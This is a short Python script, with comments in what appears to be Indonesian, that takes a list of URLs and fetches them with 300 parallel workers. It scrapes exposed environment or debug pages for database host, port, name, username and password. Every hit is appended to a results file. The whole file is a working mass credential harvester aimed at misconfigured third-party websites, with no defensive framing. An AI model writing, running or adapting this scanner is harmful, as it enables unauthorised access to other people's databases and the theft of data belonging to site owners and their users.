import requests
from bs4 import BeautifulSoup
from multiprocessing import Pool
from termcolor import colored

# membaca daftar url dari file list.txt
with open('list.txt') as f:
    urls = f.read().splitlines()

def process_url(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')

        db_host = soup.find('td', string='DB_HOST')
        if db_host:
            db_host = db_host.find_next_sibling('td').text.strip('"')

        db_port = soup.find('td', string='DB_PORT')
        if db_port:
            db_port = db_port.find_next_sibling('td').text.strip('"')

        db_database = soup.find('td', string='DB_DATABASE')
        if db_database:
            db_database = db_database.find_next_sibling('td').text.strip('"')

        db_username = soup.find('td', string='DB_USERNAME')
        if db_username:
            db_username = db_username.find_next_sibling('td').text.strip('"')

        db_password = soup.find('td', string='DB_PASSWORD')
        if db_password:
            db_password = db_password.find_next_sibling('td').text.strip('"')

        if db_host and db_port and db_database and db_username and db_password:
            result = f"{url}|{db_database}|{db_username}|{db_password}|{db_host}\n"
            print(colored(f"Found: {url}", "green"))
            with open('hasil.txt', 'a') as f:
                f.write(result.replace('"\n\n', '').replace('"\n', ''))
        else:
            result = f"Not Found: {url}\n"
            print(colored(f"Not Found: {url}", "red"))
    except requests.exceptions.RequestException as e:
        result = f"Error: {url}\n"
        print(colored(f"Error: {url}", "red"))

    return result

if __name__ == '__main__':
    with Pool(300) as p:
        results = p.map(process_url, urls)

    print("Done.")
